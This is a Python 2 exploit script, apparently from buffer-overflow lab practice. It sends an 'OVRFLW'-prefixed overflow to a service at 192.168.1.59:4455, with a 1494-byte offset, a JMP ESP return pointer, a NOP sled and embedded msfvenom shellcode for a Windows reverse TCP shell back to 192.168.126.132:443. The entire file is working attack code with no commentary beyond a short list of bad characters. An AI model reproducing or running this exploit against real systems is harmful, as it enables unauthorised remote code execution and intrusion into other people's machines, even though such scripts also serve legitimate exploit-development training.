#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.1.59"
RPORT = 4455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

tolen_buf = 3000
offset_rsp = 1494
ptr_jmp_esp = 0x56526683


badchar_test = "" 			    #start with empty string
badchars = [0x00, 0x0A]			#every time bad...
badchars += [0x04, 0x38]

# payload generated with msfvenom -p windows/shell_reverse_tcp LHOST=192.168.126.132 LPORT=443 -f c -b '\x00\x0A\x04\x38' -f c

buf = ("\xb8\xd3\xa0\x90\xe7\xda\xc6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\x90\xae\x72\x12\xea\x47\xf0"
"\xdd\x12\x98\x95\x54\xf7\xa9\x95\x03\x7c\x99\x25\x47\xd0\x16"
"\xcd\x05\xc0\xad\xa3\x81\xe7\x06\x09\xf4\xc6\x97\x22\xc4\x49"
"\x14\x39\x19\xa9\x25\xf2\x6c\xa8\x62\xef\x9d\xf8\x3b\x7b\x33"
"\xec\x48\x31\x88\x87\x03\xd7\x88\x74\xd3\xd6\xb9\x2b\x6f\x81"
"\x19\xca\xbc\xb9\x13\xd4\xa1\x84\xea\x6f\x11\x72\xed\xb9\x6b"
"\x7b\x42\x84\x43\x8e\x9a\xc1\x64\x71\xe9\x3b\x97\x0c\xea\xf8"
"\xe5\xca\x7f\x1a\x4d\x98\xd8\xc6\x6f\x4d\xbe\x8d\x7c\x3a\xb4"
"\xc9\x60\xbd\x19\x62\x9c\x36\x9c\xa4\x14\x0c\xbb\x60\x7c\xd6"
"\xa2\x31\xd8\xb9\xdb\x21\x83\x66\x7e\x2a\x2e\x72\xf3\x71\x27"
"\xb7\x3e\x89\xb7\xdf\x49\xfa\x85\x40\xe2\x94\xa5\x09\x2c\x63"
"\xc9\x23\x88\xfb\x34\xcc\xe9\xd2\xf2\x98\xb9\x4c\xd2\xa0\x51"
"\x8c\xdb\x74\xf5\xdc\x73\x27\xb6\x8c\x33\x97\x5e\xc6\xbb\xc8"
"\x7f\xe9\x11\x61\x15\x10\xf2\x4e\x42\x1b\x3a\x27\x91\x1b\x3b"
"\x0c\x1c\xfd\x51\x62\x49\x56\xce\x1b\xd0\x2c\x6f\xe3\xce\x49"
"\xaf\x6f\xfd\xae\x7e\x98\x88\xbc\x17\x68\xc7\x9e\xbe\x77\xfd"
"\xb6\x5d\xe5\x9a\x46\x2b\x16\x35\x11\x7c\xe8\x4c\xf7\x90\x53"
"\xe7\xe5\x68\x05\xc0\xad\xb6\xf6\xcf\x2c\x3a\x42\xf4\x3e\x82"
"\x4b\xb0\x6a\x5a\x1a\x6e\xc4\x1c\xf4\xc0\xbe\xf6\xab\x8a\x56"
"\x8e\x87\x0c\x20\x8f\xcd\xfa\xcc\x3e\xb8\xba\xf3\x8f\x2c\x4b"
"\x8c\xed\xcc\xb4\x47\xb6\xfd\xfe\xc5\x9f\x95\xa6\x9c\x9d\xfb"
"\x58\x4b\xe1\x05\xdb\x79\x9a\xf1\xc3\x08\x9f\xbe\x43\xe1\xed"
"\xaf\x21\x05\x41\xcf\x63")

payload = "OVRFLW"
payload += "A" * offset_rsp 
payload += struct.pack("<I", ptr_jmp_esp) 
payload += '\x90'*20
payload += buf
payload += "D" * (tolen_buf - len(payload)) 
payload += "\r\n"

s.send(payload)
s.recv(1024)
s.close()
